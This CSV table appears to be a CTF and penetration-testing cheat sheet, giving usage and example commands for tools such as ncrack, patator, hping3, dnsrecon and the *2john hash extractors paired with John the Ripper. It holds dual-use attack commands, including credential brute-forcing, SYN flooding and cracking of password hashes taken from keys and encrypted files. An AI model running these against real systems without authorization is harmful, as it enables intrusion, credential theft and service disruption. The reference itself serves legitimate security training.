command,category,brief,description,usage,examples
davtest,web,WebDAV exploitation tool,Tests WebDAV enabled servers for file upload vulnerabilities. Attempts to upload various file types to find executable uploads.,"davtest [options] -url <url>
Options:
  -url: Target URL
  -auth: Authentication (user:pass)
  -directory: Test directory
  -uploadfile: Custom file to upload","davtest -url http://target.com/webdav/
davtest -url http://target.com/dav -auth admin:admin"
dirb-gendict,web,Generate custom wordlists for dirb,Generates custom dictionaries for directory brute-forcing based on patterns or base words.,dirb-gendict <options>,dirb-gendict
dnsrecon,network,DNS enumeration and reconnaissance,"Performs DNS enumeration including zone transfers, reverse lookups, subdomain bruteforcing, and record enumeration.","dnsrecon [options] -d <domain>
Options:
  -d: Domain
  -t: Type (std, rvl, brt, srv, axfr, etc.)
  -D: Dictionary file
  -a: Perform zone transfer","dnsrecon -d target.com
dnsrecon -d target.com -t axfr
dnsrecon -d target.com -D subdomains.txt -t brt"
fierce,network,DNS reconnaissance tool,Locates non-contiguous IP space and hostnames against specified domains by bruteforcing DNS and checking for zone transfers.,"fierce [options] --domain <domain>
Options:
  --domain: Target domain
  --subdomain-file: Wordlist
  --dns-servers: Custom DNS
  --threads: Thread count","fierce --domain target.com
fierce --domain target.com --subdomain-file subs.txt"
fping,network,Fast parallel ping utility,Sends ICMP echo requests to multiple hosts simultaneously. Much faster than ping for scanning ranges.,"fping [options] <targets>
Options:
  -a: Show alive hosts
  -g: Generate target list from range
  -q: Quiet (summary only)
  -c: Count","fping -a -g 192.168.1.0/24
fping -aq 192.168.1.1 192.168.1.2
fping -g 192.168.1.1 192.168.1.254"
ghidra,reversing,NSA reverse engineering framework,"Software reverse engineering framework developed by NSA. Features disassembler, decompiler, scripting, and collaborative analysis.","ghidraRun [options]
Or use headless mode:
analyzeHeadless <project_dir> <project_name> -import <file>","ghidraRun
analyzeHeadless /tmp ghidra_proj -import binary -postScript analyze.py"
git,general,Version control system,"Distributed version control system. In CTF context, useful for finding exposed .git directories and extracting source code.","git [command] [options]
Commands:
  clone: Clone repository
  log: View history
  diff: Show changes
  checkout: Switch branches","git clone http://target.com/.git
git log --oneline
git diff HEAD~5
git checkout HEAD -- .
wget -r http://target.com/.git/"
gpg,crypto,GNU Privacy Guard encryption,Encrypts and signs data using OpenPGP standard. Manages keys and can decrypt encrypted messages or files.,"gpg [options] <file>
Options:
  -d: Decrypt
  -c: Symmetric encrypt
  --import: Import key
  --export: Export key
  --list-keys: Show keys","gpg -d encrypted.gpg
gpg -c secret.txt
gpg --import pubkey.asc
gpg --decrypt message.asc"
gpg2john,password,Extract GPG private key hashes,Extracts password hashes from GPG private keys for cracking with John the Ripper.,gpg2john <private_key> > hash.txt,"gpg2john privkey.asc > gpg_hash.txt
john --wordlist=rockyou.txt gpg_hash.txt"
hash-identifier,password,Identify hash types,Identifies the type of hash provided. Similar to hashid but uses different identification method.,"hash-identifier
Then paste hash interactively","hash-identifier
> 5d41402abc4b2a76b9719d911017c592"
hping3,network,TCP/IP packet assembler and analyzer,"Network tool for crafting and sending custom TCP/IP packets. Useful for firewall testing, port scanning, and network testing.","hping3 [options] <host>
Options:
  -S: SYN flag
  -p: Destination port
  -c: Packet count
  --flood: Send packets fast
  -a: Spoof source IP","hping3 -S -p 80 target.com
hping3 -S -p 80 -c 3 target.com
hping3 --flood -S -p 80 target.com"
ike-scan,network,IKE/IPsec VPN scanner,Discovers and fingerprints IKE hosts (VPN servers). Tests for aggressive mode vulnerabilities.,"ike-scan [options] <targets>
Options:
  -M: Multiline mode
  -A: Aggressive mode
  --id: Set identification
  -P: Save PSK to file","ike-scan 192.168.1.1
ike-scan -M -A 192.168.1.1
ike-scan -A --id=vpn 192.168.1.0/24"
jq,general,JSON processor and query tool,"Lightweight JSON processor for parsing, filtering, and transforming JSON data from command line.","jq [options] <filter> [file]
Filters:
  .: Identity
  .field: Extract field
  .field.subfield: Nested
  .[]: Array elements
  select(): Filter","cat data.json | jq .
jq '.users[0].name' data.json
jq '.[] | select(.id > 5)' data.json
curl api.example.com | jq '.results'"
keepass2john,password,Extract KeePass database hashes,Extracts password hashes from KeePass .kdbx database files for cracking with John the Ripper.,keepass2john <database.kdbx> > hash.txt,"keepass2john passwords.kdbx > keepass_hash.txt
john --wordlist=rockyou.txt keepass_hash.txt"
luks2john,password,Extract LUKS encryption hashes,Extracts password hashes from LUKS encrypted volumes for cracking with John the Ripper.,luks2john <device_or_image> > hash.txt,"luks2john encrypted.img > luks_hash.txt
john --wordlist=rockyou.txt luks_hash.txt"
nano,general,Simple text editor,Easy-to-use terminal text editor. Useful for editing scripts and configuration files during CTF challenges.,"nano [options] <file>
Commands (Ctrl+):
  O: Save
  X: Exit
  W: Search
  K: Cut line","nano script.py
nano /etc/hosts"
nbtscan,network,NetBIOS name scanner,Scans IP networks for NetBIOS name information. Discovers Windows hosts and their shares.,"nbtscan [options] <target>
Options:
  -r: Use local port 137
  -v: Verbose
  -h: Human readable","nbtscan 192.168.1.0/24
nbtscan -r 192.168.1.0/24
nbtscan -v 192.168.1.100"
ncrack,password,High-speed network authentication cracker,"Fast network authentication cracking tool from Nmap project. Supports many protocols including SSH, RDP, FTP, HTTP.","ncrack [options] <service://target>
Options:
  -U: Username file
  -P: Password file
  -u: Single username
  -p: Single password
  --user: Username","ncrack ssh://192.168.1.100 -U users.txt -P passwords.txt
ncrack rdp://target.com -u admin -P passwords.txt
ncrack ftp://192.168.1.100 -U users.txt -P pass.txt"
netdiscover,network,Active/passive ARP reconnaissance,Discovers hosts on network using ARP requests. Can run in passive mode to sniff ARP traffic.,"netdiscover [options]
Options:
  -i: Interface
  -r: IP range
  -p: Passive mode
  -c: Count","netdiscover -i eth0
netdiscover -r 192.168.1.0/24
netdiscover -p -i eth0"
nping,network,Network packet generation tool,Nmap's packet generation tool. Creates custom packets for network testing and analysis.,"nping [options] <targets>
Options:
  --tcp: TCP mode
  --udp: UDP mode
  --icmp: ICMP mode
  -p: Port
  -c: Count
  --flags: TCP flags","nping --tcp -p 80 target.com
nping --icmp -c 5 192.168.1.1
nping --tcp --flags SYN -p 22 target.com"
office2john,password,Extract Office document hashes,Extracts password hashes from password-protected Microsoft Office documents for cracking.,office2john <document> > hash.txt,"office2john protected.docx > office_hash.txt
john --wordlist=rockyou.txt office_hash.txt"
onesixtyone,network,Fast SNMP community string scanner,Fast SNMP scanner for discovering community strings. Uses multiple threads for speed.,"onesixtyone [options] <target>
Options:
  -c: Community string file
  -i: Target file
  -o: Output file","onesixtyone 192.168.1.100 public
onesixtyone -c community.txt 192.168.1.100
onesixtyone -c community.txt -i hosts.txt"
patator,password,Multi-purpose brute-forcer,Flexible brute-forcing tool supporting many protocols and services. Modular design allows custom attacks.,"patator <module> <options>
Modules:
  ftp_login, ssh_login, http_fuzz
  mysql_login, pgsql_login
  smtp_login, pop_login","patator ssh_login host=192.168.1.100 user=admin password=FILE0 0=passwords.txt
patator http_fuzz url=http://target.com/login method=POST body='user=admin&pass=FILE0' 0=passwords.txt"
pdf2john,password,Extract PDF password hashes,Extracts password hashes from encrypted PDF files for cracking with John the Ripper.,pdf2john <file.pdf> > hash.txt,"pdf2john protected.pdf > pdf_hash.txt
john --wordlist=rockyou.txt pdf_hash.txt"
putty2john,password,Extract PuTTY private key hashes,Extracts password hashes from PuTTY private key files (.ppk) for cracking.,putty2john <key.ppk> > hash.txt,"putty2john private.ppk > putty_hash.txt
john --wordlist=rockyou.txt putty_hash.txt"
r2,reversing,Radare2 shorthand command,"Alias for radare2, the reverse engineering framework. Provides disassembly, debugging, and binary analysis.","r2 [options] <file>
Options:
  -A: Analyze on load
  -d: Debug mode
  -w: Write mode","r2 ./binary
r2 -A ./binary
r2 -d ./binary"
rabin2,reversing,Binary information extractor,"Part of radare2 suite. Extracts information from binaries: symbols, imports, exports, strings, sections.","rabin2 [options] <file>
Options:
  -I: Binary info
  -i: Imports
  -E: Exports
  -z: Strings
  -S: Sections","rabin2 -I ./binary
rabin2 -z ./binary
rabin2 -i ./binary"
radiff2,reversing,Binary diffing tool,"Part of radare2 suite. Compares two binaries at different levels: bytes, basic blocks, or functions.","radiff2 [options] <file1> <file2>
Options:
  -A: Analyze for differences
  -C: Code diffing
  -g: Graph diff","radiff2 old_binary new_binary
radiff2 -A original patched"
rar2john,password,Extract RAR archive hashes,Extracts password hashes from encrypted RAR archives for cracking with John the Ripper.,rar2john <archive.rar> > hash.txt,"rar2john encrypted.rar > rar_hash.txt
john --wordlist=rockyou.txt rar_hash.txt"
screen,general,Terminal multiplexer,Terminal multiplexer allowing multiple terminal sessions in one window. Useful for maintaining persistent sessions.,"screen [options]
Options:
  -S: Session name
  -r: Reattach
  -ls: List sessions
Commands (Ctrl+a):
  c: New window
  d: Detach","screen -S ctf
screen -r ctf
screen -ls"
seclists,general,Security wordlist collection path,"Collection of wordlists for security testing. Includes usernames, passwords, URLs, fuzzing patterns, and more. Located at /usr/share/seclists/","Path: /usr/share/seclists/
Subdirectories:
  Passwords/: Password lists
  Usernames/: Username lists
  Discovery/: Web/DNS discovery
  Fuzzing/: Fuzzing payloads","ls /usr/share/seclists/Passwords/
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://target.com"
skipfish,web,Web application security scanner,Active web application security reconnaissance tool from Google. Performs comprehensive crawling and security testing.,"skipfish [options] -o <output_dir> <url>
Options:
  -o: Output directory
  -S/-W: Wordlists
  -I: Only test path
  -X: Exclude path","skipfish -o /tmp/results http://target.com
skipfish -S /usr/share/skipfish/dictionaries/complete.wl -o results http://target.com"
sleuthkit,forensics,Disk forensic analysis toolkit,Collection of command-line tools for filesystem forensics. Analyzes disk images and file systems.,"Tools include:
  mmls: Partition layout
  fls: List files/directories
  icat: Extract file by inode
  fsstat: Filesystem info
  blkcat: Display blocks","mmls disk.img
fls -r disk.img
icat disk.img 65 > extracted_file
fsstat disk.img"
sqlmapapi,web,SQLMap REST API server,RESTful API server for SQLMap. Allows programmatic control of SQL injection testing.,"sqlmapapi.py [options]
Options:
  -s: Start server
  -c: Client mode
  -H: Host
  -p: Port","sqlmapapi.py -s
sqlmapapi.py -s -H 0.0.0.0 -p 8775"
ssh2john,password,Extract SSH private key hashes,Extracts password hashes from encrypted SSH private keys for cracking with John the Ripper.,ssh2john <private_key> > hash.txt,"ssh2john id_rsa > ssh_hash.txt
john --wordlist=rockyou.txt ssh_hash.txt"
sublist3r,network,Fast subdomain enumeration,Python tool for enumerating subdomains using search engines and other online sources.,"sublist3r [options] -d <domain>
Options:
  -d: Domain
  -o: Output file
  -b: Enable bruteforce
  -t: Threads
  -e: Engines","sublist3r -d target.com
sublist3r -d target.com -o subs.txt
sublist3r -d target.com -b"
tmux,general,Terminal multiplexer,Terminal multiplexer for managing multiple terminal sessions. More modern alternative to screen.,"tmux [command]
Commands:
  new -s <name>: New session
  attach -t <name>: Attach
  ls: List sessions
Keys (Ctrl+b):
  c: New window
  d: Detach
  %: Split horizontal","tmux new -s ctf
tmux attach -t ctf
tmux ls"
truecrypt2john,password,Extract TrueCrypt volume hashes,Extracts password hashes from TrueCrypt/VeraCrypt encrypted volumes for cracking.,truecrypt2john <volume> > hash.txt,"truecrypt2john encrypted_volume > tc_hash.txt
john --wordlist=rockyou.txt tc_hash.txt"
vim,general,Advanced text editor,Powerful modal text editor. More features than nano but steeper learning curve.,"vim [options] <file>
Modes:
  i: Insert mode
  Esc: Normal mode
  :: Command mode
Commands:
  :w: Save
  :q: Quit
  /: Search","vim script.py
vim -R file.txt  # Read-only"
volatility3,forensics,Memory forensics framework,"Advanced memory forensics framework for analyzing RAM dumps. Extracts processes, network connections, credentials, and more.","vol3 [options] -f <memory_dump> <plugin>
Common plugins:
  windows.pslist: List processes
  windows.pstree: Process tree
  windows.netscan: Network connections
  windows.hashdump: Extract hashes","vol3 -f memory.dmp windows.pslist
vol3 -f memory.dmp windows.netscan
vol3 -f memory.dmp windows.hashdump"
wordlists,general,Common wordlist location path,Directory containing various wordlists for security testing. Points to /usr/share/wordlists/ on Kali.,"Path: /usr/share/wordlists/
Common lists:
  rockyou.txt: Passwords
  dirb/common.txt: Web directories
  dirbuster/: Web directories
  fasttrack.txt: Quick passwords","ls /usr/share/wordlists/
cat /usr/share/wordlists/rockyou.txt | head"
zip2john,password,Extract ZIP archive hashes,Extracts password hashes from encrypted ZIP archives for cracking with John the Ripper.,zip2john <archive.zip> > hash.txt,"zip2john encrypted.zip > zip_hash.txt
john --wordlist=rockyou.txt zip_hash.txt"
